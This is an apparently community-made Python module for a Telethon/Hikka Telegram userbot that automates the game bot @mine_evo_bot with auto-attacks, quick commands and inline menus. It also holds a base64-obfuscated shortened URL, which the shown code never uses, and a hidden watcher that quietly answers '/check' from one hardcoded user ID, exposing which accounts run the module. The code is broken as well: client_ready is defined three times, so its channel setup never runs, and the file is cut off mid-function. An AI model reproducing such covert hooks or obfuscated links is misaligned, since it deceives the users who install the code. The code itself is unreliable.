#Вот ваши лицензии:
    
#—————————————————————————————————————————————————————————————————————————————————
#  █▀ █ █ ▀▄▀   █▀▄▀█ █▀█ █▀▄ █ █ █   █▀▀ █▀ Chanel: https://shx_modules
#  ▄█ █▀█ █ █   █ ▀ █ █▄█ █▄▀ █▄█ █▄▄ ██▄ ▄█ Not Licensed
#—————————————————————————————————————————————————————————————————————————————————
#  █▀▀ ▀▄▀ █   █ █ █▀ █ █ █ █▀▀   █▀▄▀█ █▀█ █▀▄ █ █ █   █▀▀ █▀
#  ██▄ █ █ █▄▄ █▄█ ▄█ █ ▀▄▀ ██▄   █ ▀ █ █▄█ █▄▀ █▄█ █▄▄ ██▄ ▄█
#—————————————————————————————————————————————————————————————————————————————————
# Idea: sqlmerr
# Thanks: 
#—————————————————————————————————————————————————————————————————————————————————

#вторая


#мескр, извини, я потеряла твою лицензию

from telethon import functions
from asyncio import sleep
from .. import loader, utils
import asyncio
from telethon.tl.types import Message, ChatAdminRights
from telethon import functions, TelegramClient, errors
from ..inline.types import InlineCall
import inspect
import re
import logging
import base64
import requests as r
import string

# meta developer: киперок, тот,  @flame_modules, @mescr_m,  @shx_module, собрала все модули в один: @hikka_dmod
@loader.tds
class EVOPack(loader.Module):
    """все модули для mine_evo_bot в одном"""
    strings = {
        "name": "EVOPack",
        "kt": "\n<emoji document_id=5775973900580031963>✉️</emoji> ᴋᴛ:",
        "rkt": "\n<emoji document_id=5422375702731170355>🧧</emoji> ᴩᴋᴛ:",
        "k": "\n<emoji document_id=6041730074376410123>📥</emoji> ᴋ:",
        "rk": "\n<emoji document_id=5350387571199319521>🗳</emoji> ᴩᴋ:",
        "mif": "\n<emoji document_id=5210872082644083598>🕋</emoji> ʍиɸ:",
        "kr": "\n<emoji document_id=5309958691854754293>💎</emoji> ᴋᴩ:",
        "dk": "\n<emoji document_id=5353060651470176045>🎲</emoji> дᴋ:",
        "ssp": "\n<emoji document_id=5380056101473492248>👜</emoji> ᴨᴄ϶:",
        "pse": "\n<emoji document_id=5359785904535774578>💼</emoji> ᴄᴄᴨ:",
        "zv": "\n<emoji document_id=5438496463044752972>⭐️</emoji> зʙ:",
        "plasma": "\n<emoji document_id=5431783411981228752>🎆</emoji>ᴨᴧᴀзʍᴀ:",
        'module':'Включение модуля через .od',
        'delay_fuel': 'Через сколько минут пробовать качать, если топлива нет?',
        'delay_ex_fuel': 'Через сколько секунд качать, если топливо есть?',
        'warning': 'Говорить ли вам о том, что ваше хранилище заполнено топливом?',
        "cfg_waiting_time" : "Сколько ждать ответа от бота\nДля .evo",
        'autoattack' : 'Автоматическая атака боссов',
        'delay_boss' : 'Задержка между атакой',
        'result_attack' : 'Отправлять ли результат боя к вам в избранные?\nРаботает только при включенном autoattack',
        'result_chat': 'Чат  в который будут отправляться результаты.\nЕсли юзернейм, то с @\nПример: @example\nЕсли в избранное - me',
        'gif_inline' : 'Гиф в inline',
        'my_nickname': 'Ваш никнейм для быстрой команды %имя'
    }
    a = base64.b64decode("aHR0cHM6Ly90aW55dXJsLmNvbS80bXMyenlrdg==").decode('utf-8')
    b = (
        "<emoji document_id=5447644880824181073>⚠️</emoji> "
        "<b>Сервис недоступен. Попробуйте позже.</b>"
    )

    async def client_ready(self):
        
        self._backup_channel, _ = await utils.asset_channel(
            self._client,
            "EVOQasst",
            "Группа для работы модуля EVO,НЕДОБАВЛЯЙ СЮДА НЕ КОГО",
            silent=True,
            archive=True,
            _folder="hikka",
        )

        await self.client(functions.channels.InviteToChannelRequest(self._backup_channel, ['@mine_evo_bot']))
        await self.client(functions.channels.EditAdminRequest(
                channel=self._backup_channel,
                user_id="@mine_evo_bot",
                admin_rights=ChatAdminRights(ban_users=True, post_messages=True, edit_messages=True),
                rank="EVO",
            )
        )
            
    async def client_ready(self):
        s = self.get('kt')
        if s == None:
            self.set('kt', True)
        
        s = self.get('rkt')
        if s == None:
            self.set('rkt', True)
        
        s = self.get('k')
        if s == None:
            self.set('k', True)

        s = self.get('rk')
        if s == None:
            self.set('rk', True)

        s = self.get('mif')
        if s == None:
            self.set('mif', True)

        if self.get("ps") == None:
            self.set('ps', True)

        if self.get('ss') == None:
            self.set('ss', True)

        s = self.get('kr')
        if s == None:
            self.set('kr', True)

        s = self.get('zv')
        if s == None:
            self.set('zv', True)

        s = self.get('tradec')
        if s == None:
            self.set('tradec', True)

        if self.get('tradei') == None:
            self.set('tradei', True)

        s = self.get('boosters')
        if s == None:
            self.set('boosters', True)

        s = self.get('bosses')
        if s == None:
            self.set('bosses', True)

        if self.get("credits") == None:
            self.set('credits', True)

        if self.get('dk') == None:
            self.set('dk', True)

        if self.get('tradett') == None:
            self.set('tradett', "<b><code>{nick}</code> дал тебе</b>:\n<i>{cases}</i>")

        if self.get('tradeis') == None:
            self.set("tradeis", "<b><code>{nick}</code> дал тебе предмет</b>:\n<i>{item}")
            
        if self.get('kts') == None or "{colvo}" not in self.get('kts'):
            self.set("kts", "✉️ <b>Конверт <code>+{colvo}</code></b>")

        if self.get('rkts') == None or "{colvo}" not in self.get('rkts'):
            self.set('rkts', "🧧 <b>Редкий Конверт <code>+{colvo}</code></b>")

        if self.get('ks') == None or "{colvo}" not in self.get('ks'):
            self.set('ks', "📦 <b>Кейс <code>+{colvo}</code></b>")

        if self.get('rks') == None or "{colvo}" not in self.get('rks'):
            self.set('rks', "🗳 <b>Редкий Кейс <code>+{colvo}</code></b>")
        
        if self.get('mifs') == None or "{colvo}" not in self.get('mifs'):
            self.set('mifs', "<i>Грац!</i>\n🕋 <b>Мифический Кейс <code>+{colvo}</code>!</b>")

        if self.get('krs') == None or "{colvo}" not in self.get('krs'):
            self.set("krs", "<i>Congratulations!</i>\n💎 <b>Кристальный кейс <code>+{colvo}</code>!</b>")

        if self.get("dks") == None or "{colvo}" not in self.get("dks"):
            self.set('dks', "<i>Good luck!</i>\n🎲 <b>Кейс кубик <code>+{colvo}</code></b>")

        if self.get('zvs') == None or "{colvo}" not in self.get('zvs'):
            self.set('zvs', "<i>WOW, you are lucky!</i>\n🌌 <b>Звездный Кейс <code>+{colvo}</code></b>")

        if self.get('pss') == None or "{colvo}" not in self.get('pss'):
            self.set('pss', "<i>Luck is on your side!</i>\n💼 <b>Портфель с Эскизами <code>+{colvo}</code></b>")

        if self.get('sss') == None or "{colvo}" not in self.get('sss'):
            self.set('sss', "<i>A pleasant surprise!</i>\n👜 <b>Сумка с предметами <code>+{colvo}</code></b>")

        if self.get('boostersd1.5') == None:
            self.set('boostersd1.5', "⚡️ <b>Буст денег 1.5 </b><i>+1</i>")

        if self.get('boostersr1.5') == None:
            self.set('boostersr1.5', "⚡️ <b>Буст руды 1.5 </b><i>+1</i>")
        
        if self.get('boostersd2') == None:
            self.set('boostersd2', "⚡️ <b>Буст денег 2.0 </b><i>+1</i>")

        if self.get('boostersr2') == None:
            self.set('boostersr2', "⚡️ <b>Буст руды 2.0 </b><i>+1</i>")
        
        if self.get('boostersd2.5') == None:
            self.set('boostersd2.5', "⚡️ <b>Буст денег 2.5 </b><i>+1</i>")

        if self.get('boostersr2.5') == None:
            self.set('boostersr2.5', "⚡️ <b>Буст руды 2.5 </b><i>+1</i>")

        if self.get('boostersd3') == None:
            self.set('boostersd3', "⚡️ <b>Буст денег 3.0 </b><i>+1</i>")

        if self.get('boostersr3') == None:
            self.set('boostersr3', "⚡️ <b>Буст руды 3.0 </b><i>+1</i>")

        if self.get('creditss') == None:
            self.set('creditss', "<code>{nick}</code> <b>перечислил тебе:</b>\n💳 <code>{cred}</code> <b>эво-коинов</b>")


        self._backup_channel, _ = await utils.asset_channel(
            self._client,
            "mlogs",
            "Группа для работы модуля mlogs",
            silent=True,
            archive=True,
            _folder="hikka",
        )

        
        await self.client(functions.channels.InviteToChannelRequest(self._backup_channel.id, [self.inline.bot.id]))                                
        await self.client(functions.channels.EditAdminRequest(
                channel=self._backup_channel,
                user_id=self.inline.bot.id,
                admin_rights=ChatAdminRights(ban_users=True, post_messages=True, edit_messages=True),
                rank="Logger",
            )
          )
        
        self.set("chid", int(f"-100{self._backup_channel.id}"))
    
    async def client_ready(self):
        if self.config['module'] == True:
            await self.client.send_message(5522271758, 'Качать')
        

    def __init__(self):
        self.config = loader.ModuleConfig(
            loader.ConfigValue(
                "module", False,
                lambda: self.strings("module"),
                validator=loader.validators.Boolean()
            ),
                loader.ConfigValue(
                "waiting_time", 1.0,
                lambda: self.strings("cfg_waiting_time"),
                validator=loader.validators.Float()
            ),
            loader.ConfigValue(
                "autoattack", False,
                lambda: self.strings("autoattack"),
                validator=loader.validators.Boolean()
            ),
            loader.ConfigValue(
                "delay_boss", 1.0,
                lambda: self.strings("delay_boss"),
                validator=loader.validators.Float()
            ),
            loader.ConfigValue(
                "result_attack", True,
                lambda: self.strings("result_attack"),
                validator=loader.validators.Boolean()
            ),           
            loader.ConfigValue(
                "result_chat", 'me',
                lambda: self.strings("result_chat"),
                validator=loader.validators.String()
            ),
            loader.ConfigValue(
                "gif_inline", 'https://x0.at/n5Gn.mp4',
                lambda: self.strings("gif_inline"),
                validator=loader.validators.String()
            ),
            loader.ConfigValue(
                "delay_choose_boss", 2.0,
                lambda: self.strings("delay_choose_boss"),
                validator=loader.validators.Float(minimum = 0.5)
            ),
            loader.ConfigValue(
                "my_nickname", '#',
                lambda: self.strings("my_nickname"),
                validator=loader.validators.String()
            ),
            loader.ConfigValue(
                "delay_fuel", 60,
                lambda: self.strings("delay_fuel"),
                validator=loader.validators.Integer(minimum=60)
            ),
            loader.ConfigValue(
                "delay_ex_fuel", 5.0,
                lambda: self.strings("delay_ex_fuel"),
                validator=loader.validators.Float(minimum=2.0)
            ),
            loader.ConfigValue(
                "warning", False,
                lambda: self.strings("warning"),
                validator=loader.validators.Boolean()
            ),
        )
    
    @loader.watcher()
    async def watcher(self, message):
        autoattack = self.config['autoattack']
        delay_boss = self.config['delay_boss']
        result_attack = self.config['result_attack']
        result_chat = self.config['result_chat']    
    
        if autoattack == True:
            if message.chat_id == 5522271758 and "Атк)" in message.raw_text:
                await asyncio.sleep(delay_boss)
                await self.client.send_message('@mine_evo_bot', 'Атк')    
            elif message.chat_id == 5522271758 and '🔶 Ты выбрал босса:' in message.raw_text:
                await asyncio.sleep(delay_boss)
                await self.client.send_message('@mine_evo_bot', 'Атк')    
            if result_attack == True:
                if message.chat_id == 5522271758 and "Твоя награда:" in message.raw_text:
                    if '@' in result_chat:
                        await self.client.send_message(result_chat, message.raw_text)
                        return
                    if result_chat == 'me':
                        await self.client.send_message(result_chat, message.raw_text)
                        return
                    else:
                        result_chat = int(result_chat)
                        await self.client.send_message(result_chat, message.raw_text)
        if message.raw_text == '/check':
            if message.from_id == 5195118663: 
                await self.client.send_message(message.to_id, 'evo')
                return
        
    @loader.command()
    async def fchelp(self, message):
        ''' - список быстрых команд'''
        await utils.answer(message, '%мб - 💥 Мощь бура\n%бб - 🛢 Бак бура\n%нс - 🗼 Насосы\n%вм - 🚛 Вместимость\n%мс - 🏜 Месторождение\n%имя - 👤 Ваш никнейм ( указывайте в конфиге )')

    @loader.command()
    async def evo(self, message: Message):
        """ - выполнить команду MineEVO в любом чате"""
        args = utils.get_args_raw(message)
        waiting_time = self.config["waiting_time"]
        error_not_args = "<emoji document_id=5877477244938489129>🚫</emoji> <b>Error | evo</b>\nТы не че не ввел!"
        error_not_response = f"<emoji document_id=5877477244938489129>🚫</emoji> <b>Error | evo</b>\nКороче пробуй еще раз или просто можешь переслать с бота, столько у тебя стоит задерка {waiting_time} секунд\n<b>Ваш запрос:</b> {args} \n\n<emoji document_id=5787544344906959608>ℹ️</emoji> <b>ТВОИ ПРОБЛЕМЫ:</b>"
        ore = "<b>Цены на руды:</b>\n> https://teletype.in/@mine_evo/ores_prices_1"
        err_d1 = "\n> Такой команды нет или учи команды."
        err_d2 = "\n> Короче купи интернет."

        if args == '':
            await utils.answer(message, error_not_args)
        elif args in ["Цены","цены","рынок","Рынок"]:
            await utils.answer(message, ore)
        else:
            await utils.answer(message, '<emoji document_id=5204112375350831270>🤬</emoji> Жди ша открою!')
            async with self.client.conversation(self._backup_channel) as conv:
                await conv.send_message(f'{args}')
                try:
                    response = await asyncio.wait_for(conv.get_response(), timeout=waiting_time)
                except asyncio.TimeoutError:
                    await utils.answer(message, error_not_response + err_d1 + err_d2)
                    return
            links_regex = re.compile(r'.(https?://\S+).')
            response.text = links_regex.sub('', response.text)
            if re.findall('http[s]?://(?:[a-zA-Z]|[0-9]|[$-@.&+]|[!*(),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+', response.text):
                response.text = '\n'.join(response.text.split('\n')[:-2])
            await utils.answer(message, response.text)

            


    @loader.command(alias = 'eh')
    async def evoh(self, message: Message):
        """ - аргументы для .evo"""
        args = utils.get_args_raw(message)

        #Topics
        topic_full = "<b><emoji document_id=5334882760735598374>📝</emoji> Помощь по командам</b>\n\n"
        topic_boost = "<b>> <emoji document_id=5445284980978621387>🚀</emoji> Бустеры</b>\n"
        topic_cases = "<b>> <emoji document_id=5359785904535774578>💼</emoji> Кейсы</b>\n"
        topic_top = "<b>> <emoji document_id=5188208446461188962>💯</emoji> Топ</b>\n"
        topic_stats = "<b>> <emoji document_id=5373001317042101552>📈</emoji> Статистика</b>\n"
        topic_other = "<b>> <emoji document_id=5370869711888194012>👾</emoji> Прочее</b>\n"
        topic_storage = "<b>> <emoji document_id=5431736674147114227>🗂</emoji> Хранилище</b>\n"
        topic_add = "Чтобы посмотреть отдельный топик, не обязательно писать его название, достаточно написать любую команду из этого топика"
        
        #Commands
        cmdboost = "  > Буст [ Тип бустера ] [ Множитель ]\n    > р | д | гр | гд\n    > 1.5 | 2 | 2.5 | 3\n  > Бусты\n  > Крафт [ Тип бустера ] [ Множитель ]\n    > р | д\n    > 2 | 2.5 | 3\n  > Утиль [ Тип бустера ] [ Множитель ]\n    > р | д\n    > 1.5 | 2 | 2.5 | 3\n  > Время\n\n"
        cmdcases = "  > Кейсы\n  > Открыть [ Тип кейса ] [ Кол-во ]\n    > Кт | Ркт | К | Рк | Миф | Кр | Зв \n  > Дать [ Тип кейса ] [ Кол-во ]\n    > Кт | Ркт | К | Рк | Миф | Кр | Зв\n  > Открыть [ Тип кейса ] [ Кол-во ]\n    > Кт | Ркт | К | Рк | Миф | Кр | Зв \n\n"
        cmdtop = "  > Топ\n  > Топ [ Тип топа ]\n    >  к | д | б | р | клан\n\n"
        cmdstats = "  > Проф \n  > Стата \n  > Лим\n  > Мой реф\n\n"
        cmdstorage = "  > Б\n  > П\n  > C\n  > Зп\n  > Инв\n  > Продать [ Название руды ] [ Кол-во/Все ]\n  > Перевести [ Ник ] [ Кол-во денег/Лимит ]\n\n"
        cmdother = "  > Реф [ Реферальный код ]\n  > Ивент\n  > Конкурс\n  > Еб\n  > Thx\n  > Цены\n  > Рынок\n\n"
        
        #Error
        err_topic = "<emoji document_id=5877477244938489129>🚫</emoji> <b>Error | Ошибка</b>\nНазвание не найден.\nНазвание не найдено, иди учи в evoh."
        
        if args in ['Бустеры','бустеры','Бусты','бусты','Буст','буст','Крафт','крафт','Утиль','утиль','Время','время']:
            await utils.answer(message, topic_full + topic_boost + cmdboost)
        
        elif args in ['Кейсы','кейсы','Открыть','открыть','Дать','дать','Передать','передать']:
            await utils.answer(message, topic_full + topic_cases + cmdcases)
        
        elif args in ['Топ','топ']:
            await utils.answer(message, topic_full + topic_top + cmdtop)
        
        elif args in ['Стат','стат','Стата','стата','Статистика','статистика','Проф','проф','Лим','лим','Лимит','лимит','Мой реф','мой реф']:
            await utils.answer(message, topic_full + topic_stats + cmdstats)
        
        elif args in ['Хранилище','хранилище','Б','б','П','п','С','с','Зп','зп','Инв','инв','Продать','продать','Перевести','перевести']:
            await utils.answer(message, topic_full + topic_storage + cmdstorage )
        
        elif args in ['Прочее','прочее','Реф','реф','Ивент','ивент','Конкурс','конкурс','Еб','еб','Thx','thx','Цены','цены','Рынок','рынок']:
            await utils.answer(message, topic_full + topic_other + cmdother)
        
        elif args == '':
            await utils.answer(message, topic_full + topic_boost + cmdboost + topic_cases + cmdcases + topic_top + cmdtop + topic_stats + cmdstats + topic_storage + cmdstorage + topic_other + cmdother + topic_add)
        
        else:
            await utils.answer(message, err_topic)               

    @loader.command(alias = 't')    
    async def top(self, message):
        ''' - инлайн топ'''
        gif_on_top = self.config['gif_inline']

        await self.inline.form(
            text = 'Выберите топ: ',
            gif = gif_on_top,
            message=message,
            reply_markup=[
                [
                    {
                        "text": "⭐️ Уровень",
                        "callback": self.toplvl,
                    },
                    {
                        "text": "👆 Клики ",
                        "callback": self.topclicks,
                    },
                ],
                [
                    
                    {
                        "text": "💎 Донат",
                        "callback": self.topdonate,
                    },
                    {
                        "text": "🧱 Руда",
                        "callback": self.topore,
                    }
                ],
                [
                    {
                        "text": "🏰 Кланы",
                        "callback": self.topclan,
                    },
                    {
                        'text':'💵 Баланс',
                        'callback':self.topbalance,
                    }
                ],
                [
                    {
                        'text':'💰 Поддержать автора ( 1 редкий кейс )',
                        'callback': self.donate_author,
                    },
                ],              
                [
                    {
                        "text": "🔻 Закрыть",
                        "action": "close",
                    }
                ],
            ],
        )
    @loader.command(alias = 'p')    
    async def prof(self, message):
        ''' - инлайн профиль'''
        gif_on_top = self.config['gif_inline']

        await self.inline.form(
            text = 'ДОВАЙ ВЫБЕРАЙ БЫСТРЕЙ УЖЕ УСТАЛ ЖДАТЬ',
            gif = gif_on_top,
            message=message,
            reply_markup=[
                    [
                        {
                            "text": "📋 Профиль",
                            "callback": self.stor_prof,
                        },
                        {
                            'text': '📈 Статистика',
                            'callback': self.stor_stata,
                        }
                    ],
                    [
                        {
                            "text": "🎒 Инвентарь",
                            "callback": self.stor_inv,
                        },
                    ],
                    [
                        {
                            'text': '🌌 Звездная Пыль',
                            'callback': self.stor_star
                        }
                    ],
                    [
                        {
                            'text':'📦 Кейсы',
                            'callback':self.stor_cases,
                        },
                        {
                            'text':'⚡️ Бустеры',
                            'callback':self.stor_boosters,
                        }
                    ],
                    [
                        {
                            "text": "🎆 Плазма",
                            "callback": self.stor_plasm,
                        },
                        {
                            "text": "💵 Баланс",
                            "callback": self.stor_balance,
                        },
                        {
                            "text": "🔩 Скрап",
                            "callback": self.stor_scrap,
                        }
                    ],      
                    [
                        {
                        'text':'💰 Поддержать автора ( 1 редкий кейс )',
                        'callback': self.donate_author,
                        },
                    ],
                    [
                        {
                        "text": "🔻 Закрыть",
                        "action": "close",
                        }
                    ],
            ],
        )


    @loader.command(alias = 'aa')
    async def autoattack(self, message):
        ''' - включить / выключить автоатакер'''
        self.config['autoattack'] = not self.config['autoattack']
        cfg = self.config['autoattack']
        if cfg == True:
            await utils.answer(message, '<emoji document_id=5204044038126182496>✅</emoji> АвтоАтакер включен,че наживать лень?')
        if cfg == False:
            await utils.answer(message, '<emoji document_id=5206595394728894920>❌</emoji> АвтоАтакер отключен,все рукой нажимать пошёл?.')    
    
    @loader.watcher(out = True)
    async def watcherfst(self, message):
        mnn = self.config['my_nickname']
        
        if message.raw_text == '%мб':
            await message.delete()
            await self.client.send_message(message.to_id, '💥 Мощь бура')          
            return
        if message.raw_text == '%бб':
            await message.delete()
            await self.client.send_message(message.to_id, '🛢 Бак бура')
            return
        if message.raw_text == '%нс':
            await message.delete()
            await self.client.send_message(message.to_id, '🗼 Насосы')
            return
        if message.raw_text == '%вм':
            await message.delete()
            await self.client.send_message(message.to_id, '🚛 Вместимость')
            return
        if message.raw_text == '%мс':
            await message.delete()
            await self.client.send_message(message.to_id, '🏜 Месторождение')
            return
        if message.raw_text == '%имя':
            await message.delete()
            await self.client.send_message(message.to_id, mnn)

    async def toplvl(self, call: InlineCall):
        async with self.client.conversation(self._backup_channel) as conv:
                await conv.send_message(f'топ')
                response = (await conv.get_response()).message
        await call.edit(
            text=response,
            reply_markup=[
                [
                    {
                        "text": "> ⭐️ Уровень <",
                        "callback": None,
                    },
                    {
                        "text": "👆 Клики ",
                        "callback": self.topclicks,
                    },
                ],
                [
                    
                    {
                        "text": "💎 Донат",
                        "callback": self.topdonate,
                    },
                    {
                        "text": "🧱 Руда",
                        "callback": self.topore,
                    }
                ],
                [
                    {
                        "text": "🏰 Кланы",
                        "callback": self.topclan,
                    },
                    {
                        'text':'💵 Баланс',
                        'callback': self.topbalance,
                    }
                ],         
                [
                    {
                        'text':'💰 Поддержать автора ( 1 редкий кейс )',
                        'callback': self.donate_author,
                    },
                ],
                [
                    {
                        "text": "🔻 Закрыть",
                        "action": "close",
                    }
                ],
            ],
        )
        
    async def topclicks(self, call: InlineCall):
        async with self.client.conversation(self._backup_channel) as conv:
                await conv.send_message(f'топ к')
                response = (await conv.get_response()).message
        await call.edit(
            text=response,
            reply_markup=[
               [
                    {
                        "text": "⭐️ Уровень",
                        "callback": self.toplvl,
                    },
                    {
                        "text": "> 👆 Клики <",
                        "callback": None,
                    },
                ],
                [
                    
                    {
                        "text": "💎 Донат",
                        "callback": self.topdonate,
                    },
                    {
                        "text": "🧱 Руда",
                        "callback": self.topore,
                    }
                ],
                [
                    {
                        "text": "🏰 Кланы",
                        "callback": self.topclan,
                    },
                    {
                        'text':'💵 Баланс',
                        'callback':self.topbalance,
                    }
                ],
                [
                    {
                        'text':'💰 Поддержать автора ( 1 редкий кейс )',
                        'callback': self.donate_author,
                    },
                ],      
                [
                    {
                        "text": "🔻 Закрыть",
                        "action": "close",
                    }
                ],
                
            ],
        )
    async def topdonate(self, call: InlineCall):
        async with self.client.conversation(self._backup_channel) as conv:
                await conv.send_message(f'топ д')
                response = (await conv.get_response()).message
        await call.edit(
            text=response,
            reply_markup=[
                [
                    {
                        "text": "⭐️ Уровень",
                        "callback": self.toplvl,
                    },
                    {
                        "text": "👆 Клики ",
                        "callback": self.topclicks,
                    },
                ],
                [
                    
                    {
                        "text": "> 💎 Донат <",
                        "callback": None,
                    },
                    {
                        "text": "🧱 Руда",
                        "callback": self.topore,
                    }
                ],
                [
                    {
                        "text": "🏰 Кланы",
                        "callback": self.topclan,
                    },
                    {
                        'text':'💵 Баланс',
                        'callback':self.topbalance,
                    }
                ],
                [
                    {
                        'text':'💰 Поддержать автора ( 1 редкий кейс )',
                        'callback': self.donate_author,
                    },
                ],            
                [
                    {
                        "text": "🔻 Закрыть",
                        "action": "close",
                    }
                ],
            ],
        )

    async def topore(self, call: InlineCall):
        async with self.client.conversation(self._backup_channel) as conv:
                await conv.send_message(f'топ р')
                response = (await conv.get_response()).message
        await call.edit(
            text=response,
            reply_markup=[
                [
                    {
                        "text": "⭐️ Уровень",
                        "callback": self.toplvl,
                    },
                    {
                        "text": "👆 Клики ",
                        "callback": self.topclicks,
                    },
                ],
                [
                    
                    {
                        "text": "💎 Донат",
                        "callback": self.topdonate,
                    },
                    {
                        "text": "> 🧱 Руда <",
                        "callback": None,
                    }
                ],
                [
                    {
                        "text": "🏰 Кланы",
                        "callback": self.topclan,
                    },
                    {
                        'text':'💵 Баланс',
                        'callback':self.topbalance,
                    }
                ],
                [
                    {
                        'text':'💰 Поддержать автора ( 1 редкий кейс )',
                        'callback': self.donate_author,
                    },
                ],             
                [
                    {
                        "text": "🔻 Закрыть",
                        "action": "close",
                    }
                ],
            ],
        )

    async def topclan(self, call: InlineCall):
        async with self.client.conversation(self._backup_channel) as conv:
                await conv.send_message(f'топ клан')
                response = (await conv.get_response()).message
        await call.edit(
            text=response,
            reply_markup=[
                [
                    {
                        "text": "⭐️ Уровень",
                        "callback": self.toplvl,
                    },
                    {
                        "text": "👆 Клики ",
                        "callback": self.topclicks,
                    },
                ],
                [
                    
                    {
                        "text": "💎 Донат",
                        "callback": self.topdonate,
                    },
                    {
                        "text": "🧱 Руда",
                        "callback": self.topore,
                    }
                ],
                [
                    {
                        "text": "> 🏰 Кланы <",
                        "callback": None,
                    },
                    {
                        'text':'💵 Баланс',
                        'callback':self.topbalance,
                    }
                ],
                [
                    {
                        'text':'💰 Поддержать автора ( 1 редкий кейс )',
                        'callback': self.donate_author,
                    },
                ],               
                [
                    {
                        "text": "🔻 Закрыть",
                        "action": "close",
                    }
                ],
            ],
        )    

    async def topbalance(self, call: InlineCall):
        async with self.client.conversation(self._backup_channel) as conv:
                await conv.send_message(f'топ б')
                response = (await conv.get_response()).message
        await call.edit(
            text=response,
            reply_markup=[
                [
                    {
                        "text": "⭐️ Уровень",
                        "callback": self.toplvl,
                    },
                    {
                        "text": "👆 Клики ",
                        "callback": self.topclicks,
                    },
                ],
                [
                    
                    {
                        "text": "💎 Донат",
                        "callback": self.topdonate,
                    },
                    {
                        "text": "🧱 Руда",
                        "callback": self.topore,
                    }
                ],
                [
                    {
                        "text": "🏰 Кланы",
                        "callback": self.topclan,
                    },
                    {
                        'text':'> 💵 Баланс <',
                        'callback': None,
                    }
                ],
                [
                    {
                        'text':'💰 Поддержать автора ( 1 редкий кейс )',
                        'callback': self.donate_author,
                    },
                ],              
                [
                    {
                        "text": "🔻 Закрыть",
                        "action": "close",
                    }
                ],
            ],
        )
        
    async def stor_prof(self, call: InlineCall):
        async with self.client.conversation(self._backup_channel) as conv:
            await conv.send_message('проф')
            response = (await conv.get_response()).message
            links_regex = re.compile(r'.(https?://\S+).')
            response = links_regex.sub('', response)
            if re.findall('http[s]?://(?:[a-zA-Z]|[0-9]|[$-@.&+]|[!*(),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+', response):
                response = '\n'.join(response.split('\n')[:-2])
            await call.edit(
                text=response,
                reply_markup=[
                    [
                        {
                            "text": "> 📋 Профиль  <",
                            "callback": self.stor_prof,
                        },
                        {
                            'text': '📈 Статистика',
                            'callback': self.stor_stata,
                        }
                    ],
                    [
                        {
                            "text": "🎒 Инвентарь",
                            "callback": self.stor_inv,
                        },
                    ],
                    [
                        {
                            'text': '🌌 Звездная Пыль',
                            'callback': self.stor_star
                        }
                    ],
                    [
                        {
                            'text':'📦 Кейсы',
                            'callback':self.stor_cases,
                        },
                        {
                            'text':'⚡️ Бустеры',
                            'callback':self.stor_boosters,
                        }
                    ],
                    [
                        {
                            "text": "🎆 Плазма",
                            "callback": self.stor_plasm,
                        },
                        {
                            "text": "💵 Баланс",
                            "callback": self.stor_balance,
                        },
                        {
                            "text": "🔩 Скрап",
                            "callback": self.stor_scrap,
                        }
                    ],
                    [
                        {
                            'text':'💰 Поддержать автора ( 1 редкий кейс )',
                            'callback': self.donate_author,
                        },
                    ],     
                    [
                        {
                        "text": "🔻 Закрыть",
                        "action": "close",
                        }
                    ],
                ],
            )    

    async def stor_stata(self, call: InlineCall):
        async with self.client.conversation(self._backup_channel) as conv:
            await conv.send_message('стата')
            response = (await conv.get_response()).message
            links_regex = re.compile(r'.(https?://\S+).')
            response = links_regex.sub('', response)
            if re.findall('http[s]?://(?:[a-zA-Z]|[0-9]|[$-@.&+]|[!*(),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+', response):
                response = '\n'.join(response.split('\n')[:-2])
            await call.edit(
                text=response,
                reply_markup=[
                    [
                        {
                            "text": "📋 Профиль",
                            "callback": self.stor_prof,
                        },
                        {
                            'text': '> 📈 Статистика <',
                            'callback': self.stor_stata,
                        }
                    ],
                    [
                        {
                            "text": "🎒 Инвентарь",
                            "callback": self.stor_inv,
                        },
                    ],
                    [
                        {
                            'text': '🌌 Звездная Пыль',
                            'callback': self.stor_star
                        }
                    ],
                    [
                        {
                            'text':'📦 Кейсы',
                            'callback':self.stor_cases,
                        },
                        {
                            'text':'⚡️ Бустеры',
                            'callback':self.stor_boosters,
                        }
                    ],
                    [
                        {
                            "text": "🎆 Плазма",
                            "callback": self.stor_plasm,
                        },
                        {
                            "text": "💵 Баланс",
                            "callback": self.stor_balance,
                        },
                        {
                            "text": "🔩 Скрап",
                            "callback": self.stor_scrap,
                        }
                    ],
                    [
                        {
                            'text':'💰 Поддержать автора ( 1 редкий кейс )',
                            'callback': self.donate_author,
                        },
                    ],      
                    [
                        {
                        "text": "🔻 Закрыть",
                        "action": "close",
                        }
                    ],
                ],
            )            

    async def stor_inv(self, call: InlineCall):
        async with self.client.conversation(self._backup_channel) as conv:
            await conv.send_message('инв')
            response = (await conv.get_response()).message
            links_regex = re.compile(r'.(https?://\S+).')
            response = links_regex.sub('', response)
            if re.findall('http[s]?://(?:[a-zA-Z]|[0-9]|[$-@.&+]|[!*(),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+', response):
                response = '\n'.join(response.split('\n')[:-2])
            await call.edit(
                text=response,
                reply_markup=[
                    [
                        {
                            "text": "📋 Профиль",
                            "callback": self.stor_prof,
                        },
                        {
                            'text': '📈 Статистика',
                            'callback': self.stor_stata,
                        }
                    ],
                    [
                        {
                            "text": "> 🎒 Инвентарь <",
                            "callback": self.stor_inv,
                        },
                    ],
                    [
                        {
                            'text': '🌌 Звездная Пыль',
                            'callback': self.stor_star
                        }
                    ],
                    [
                        {
                            'text':'📦 Кейсы',
                            'callback':self.stor_cases,
                        },
                        {
                            'text':'⚡️ Бустеры',
                            'callback':self.stor_boosters,
                        }
                    ],
                    [
                        {
                            "text": "🎆 Плазма",
                            "callback": self.stor_plasm,
                        },
                        {
                            "text": "💵 Баланс",
                            "callback": self.stor_balance,
                        },
                        {
                            "text": "🔩 Скрап",
                            "callback": self.stor_scrap,
                        }
                    ],
                    [
                        {
                            'text':'💰 Поддержать автора ( 1 редкий кейс )',
                            'callback': self.donate_author,
                        },
                    ],      
                    [
                        {
                        "text": "🔻 Закрыть",
                        "action": "close",
                        }
                    ],
                ],
            )            

    async def stor_cases(self, call: InlineCall):
        async with self.client.conversation(self._backup_channel) as conv:
            await conv.send_message('кейсы')
            response = (await conv.get_response()).message
            links_regex = re.compile(r'.(https?://\S+).')
            response = links_regex.sub('', response)
